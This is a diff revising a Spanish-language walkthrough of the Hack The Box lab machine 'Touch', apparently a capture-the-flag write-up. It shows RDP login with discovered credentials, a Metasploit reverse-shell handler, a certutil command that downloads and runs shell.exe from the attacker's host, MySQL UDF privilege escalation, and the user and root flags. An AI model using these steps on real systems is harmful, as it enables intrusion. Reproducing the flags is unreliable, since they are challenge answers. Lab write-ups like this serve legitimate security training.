@@ -1,18 +1,19 @@
----
+
 # Touch WriteUp - Hack The Box
-**Date**: `2026-10-08`
-**Level**: `Easy`
-**OS**: `Windows`
-**IP**: `10.129.127.154`
-**Tags**: `samba`, `metasploit`
----
+- **ID**: `touch`
+- **Date**: `10/10/2026`
+- **Level**: `Easy`
+- **OS**: `Windows`
+- **IP**: `10.129.127.154`
+- **Tags**: `Nexion DeviceHub`, `RDP`, `WinRM`, `Meterpreter`, `Metasploit`, `MySQL`, `MySQL UDF`, `Reverse Shell`, `Telnet`, `CVE-2026-24061`
 
 ## Executive Summary
-Touch es una máquina Windows fácil.
+Touch es una máquina Windows de dificultad fácil. La intrusión comienza con la enumeración del panel **Nexion DeviceHub** en el puerto `8443`, donde se descubre el número de serie del dispositivo y se obtienen credenciales que permiten acceder por **RDP**. Desde el entorno de escritorio se consigue una sesión Meterpreter y, mediante la enumeración de la aplicación y de **MySQL**, se prepara una escalada de privilegios. Finalmente, un servicio Telnet local vulnerable a **CVE-2026-24061** permite obtener acceso como **Administrator**.
 
 ---
 
 ## Reconocimiento
+La primera fase consiste en comprobar la disponibilidad del objetivo, identificar el sistema operativo y descubrir los puertos expuestos y los servicios que se ejecutan.
 
 ### Ping 
 Lo primero que haremos es saber si tenemos conexión con la máquina victima y saber a qué sistema operativo nos enfrentamos.
@@ -140,6 +141,7 @@ Esto nos confirma que el puerto `8443` está ejecutando una aplicación web y qu
 Por ahora no tenemos credenciales, por lo que antes de intentar realizar ataques de fuerza bruta, es conveniente **enumerar la aplicación** y buscar funcionalidades, endpoints, archivos o información que puedan ayudarnos a descubrir cómo funciona el sistema de autenticación.
 
 ## Enumeration
+Con los servicios identificados, comenzamos a investigar la aplicación web para encontrar rutas, información del dispositivo y credenciales que permitan avanzar.
 
 ### Curl
 Vamos a usar **Curl** para descubrir cómo es el código de la página:
@@ -208,7 +210,7 @@ api/status              [Status: 200, Size: 114, Words: 3, Lines: 1, Duration: 1
 :: Progress: [295/295] :: Job [1/1] :: 385 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
 ```
 Entramos a `http://10.129.127.154:8443/api/status`y encontramos lo siguiente:
-![Descubrimiento web](/images/machines/touch/img-01.png)
+![Descubrimiento api](/images/machines/touch/img-02.png)
 Obtenemos la información:
 - `device`	"Nexion DeviceHub DH-100"
 - `serial`	"NX-DH-2024-B7042"
@@ -217,7 +219,7 @@ Obtenemos la información:
 - `uptime`	1056
 
 Obtuvimos el **Serial**, usemos para intentar acceder:
-![Descubrimiento web](/images/machines/touch/img-01.png)
+![Descubrimiento Serial](/images/machines/touch/img-03.png)
 Encontramos un **Dashboard**, en el cuál hay un **Scanner** y una **Impresora** en los cuales hay credenciales que nos pueden servir: 
 | Username: KioskUser
 | Password: K!0sk2026#
@@ -225,43 +227,41 @@ Encontramos un **Dashboard**, en el cuál hay un **Scanner** y una **Impresora**
 ---
 
 ## Exploitation
+En esta fase utilizamos la información obtenida durante la enumeración para acceder al entorno Windows y conseguir una sesión desde la que continuar la investigación.
 
 ### XFreeRPD
 Después de conseguir las credenciales debemos intentar acceder con ellas usando **XFreeRPD**:
 ```bash
 xfreerdp /v:10.129.127.154 /u:KioskUser /p:'K!0sk2026#' /cert:ignore
 ```
-IMG04
+![Interfaz gráfica del servidor](/images/machines/touch/img-04.png)
 
-IMG 05
+![Interfaz gráfica del servidor](/images/machines/touch/img-05.png)
 
-IMG 06
+![Interfaz gráfica del servidor](/images/machines/touch/img-06.png)
 La información que necesitamos está en HackTheBox:
+> In the Layover machine, you uncovered a name and a booking confirmation code. Maybe they'll come in handy here? **Jenny Crawford / KS7X2M**
 
-Machine Information
-
-In the Layover machine, you uncovered a name and a booking confirmation code. Maybe they'll come in handy here? Jenny Crawford / KS7X2M
-
-IMG 07
-
-IMG 08
+![Utilizando datos en la interfaz](/images/machines/touch/img-07.png)
+![Escaneando](/images/machines/touch/img-08.png)
 Damos escanear y nos saldrá un error, ese error lo podemos omitir si desde el dashboard apagamos el Scanner.
-IMG 09
+![Apagando el Scanner](/images/machines/touch/img-09.png)
 Y lo intentamos otra vez
-IMG 10
+![Reintentando escanear](/images/machines/touch/img-10.png)
+### Acceso al entorno de escritorio de Windows y obtención de user flag
 Damos click en el enlace que nos aparece y nos aparecerá el navegador Edge.
-IMG 11
-Tenemos que ejecutar el cmd, para ello abriremos un archivo con Ctrl + O.
-Escribimos `C:\Windows\System32\cmd.exe` en el recuadro y damos enter.
-IMG 12
-Nos lo descargará
-IMG 13
-Le damos click y nos abrirá el cmd.
+![Navegador Edge](/images/machines/touch/img-11.png)
+Tenemos que ejecutar el cmd, para ello abriremos un archivo con **Ctrl + O**.
+Escribimos `C:\Windows\System32\cmd.exe` en el recuadro y damos enter:
+![Descargando un cmd.exe](/images/machines/touch/img-12.png)
+Nos lo descargará:
+![cmd.exe descargado](/images/machines/touch/img-13.png)
+Le damos click y nos abrirá el cmd:
+![cmd.exe descargado](/images/machines/touch/img-14.png)
+Y encontramos la **user flag**: `3c9325a3ec4be2d7af987ef7099f21fe`
 
-USER
-IMG 14
-
-AHora necesitamos trabajar en nuestro equipo que es más cómodo, para ello ejecutamos lo siguiente:
+### Haciendo una Reverse Shell
+Ahora necesitamos trabajar en nuestro equipo que es más cómodo, para ello ejecutamos lo siguiente:
 ```bash
 mkdir -p /tmp/share
 cd /tmp/share
@@ -293,15 +293,13 @@ LHOST => 10.10.14.17
 LPORT => 4445
 [*] Started reverse TCP handler on 10.10.14.17:4445 
 ```
-
 Ahora desde la máquina Windows ejecutamos lo siguiente:
 ```bash
 certutil -urlcache -split -f http://10.10.14.17:8000/shell.exe shell.exe
 shell.exe
 ```
 Como lo muestra la imagen:
-IMG15
-
+![Descargando payload reverse shell](/images/machines/touch/img-15.png)
 Y luego ejecutamos el shell.exe:
 ```powershell
 shell.exe
@@ -320,6 +318,10 @@ Logged On Users : 1
 Meterpreter     : x64/windows
 meterpreter > 
 ```
+## Enumeración del sistema desde Meterpreter
+
+Ahora que tenemos una sesión en la máquina, podemos enumerar el sistema, revisar los archivos de la aplicación y buscar credenciales o permisos que permitan escalar privilegios.
+
 Ya tenemos acceso, miramos nuevamente el USER:
 ```bash
 meterpreter > cd Desktop
@@ -649,6 +651,10 @@ nexion_app	localhost	N	N
 repl_kiosk_b7	localhost	N	N
 root	localhost	Y	Y
 ```
+## Escalada de privilegios mediante MySQL
+
+La enumeración de MySQL revela permisos que permiten registrar una función UDF y ejecutar comandos del sistema desde la base de datos.
+
 Ahora sabemos que podemos hacer UDP HAJACKING:
 
 Necesitamos subir un archivo:
@@ -771,22 +777,26 @@ Microsoft Windows [Version 10.0.26100.9457]
 
 C:\MySQL\data>
 ```
-Ahora entramos la flag ROOT:
+Ahora obtenemos la root flag:
 ```powershell
 C:\>type "C:\Users\Administrator\Desktop\root.txt"
 type "C:\Users\Administrator\Desktop\root.txt"
-3c9740528689b8de49b873598596fc79
 ```
+Resultado: `3c9740528689b8de49b873598596fc79`
 Listo
 
-# Conclusión
+## Conclusión
 
-La máquina Orion demuestra una cadena de ataque en varias etapas.
+Touch presenta una cadena de ataque centrada en una aplicación web de dispositivos y en servicios internos de Windows.
 
-Inicialmente, el reconocimiento permitió identificar los servicios **SSH** y **HTTP**. La enumeración del servidor web reveló el uso de **Craft CMS**, y posteriormente la enumeración de contenido permitió localizar el panel administrativo.
+El reconocimiento identificó los puertos **135**, **3389**, **5985** y **8443**. La enumeración de **Nexion DeviceHub** permitió localizar el endpoint `/api/status`, recuperar el número de serie del dispositivo y obtener credenciales para acceder al escritorio remoto mediante **RDP**.
 
-Después de comprometer la aplicación conseguimos acceso mediante Meterpreter, desde donde pudimos revisar los archivos de configuración de **Craft CMS**. El archivo .env contenía las credenciales de la base de datos **MySQL**.
+Desde el entorno gráfico se consiguió acceso al sistema y posteriormente se estableció una sesión **Meterpreter**. La enumeración de los archivos de **HTB Airways** y de la configuración de **MySQL** permitió identificar credenciales y privilegios que hicieron posible utilizar una función UDF para ejecutar comandos.
 
-Con acceso a **MySQL** encontramos el hash de contraseña del usuario administrador adam. Utilizando **Hashcat** y el diccionario `rockyou.txt` conseguimos recuperar la contraseña y utilizarla para acceder mediante **SSH**.
+Finalmente, se identificó un servicio **Telnet** accesible únicamente desde `127.0.0.1` y vulnerable a **CVE-2026-24061**. Su explotación permitió completar la escalada de privilegios y obtener la flag de Administrator.
 
-Finalmente, una enumeración de servicios locales reveló un servicio Telnet que no era visible desde el exterior porque únicamente escuchaba en `127.0.0.1`. La versión instalada era vulnerable a **CVE-2026-24061**, lo que permitió conseguir acceso como **root**.
+## Flags
+### User flag
+`3c9325a3ec4be2d7af987ef7099f21fe`
+### Root flag
+`3c9740528689b8de49b873598596fc79`
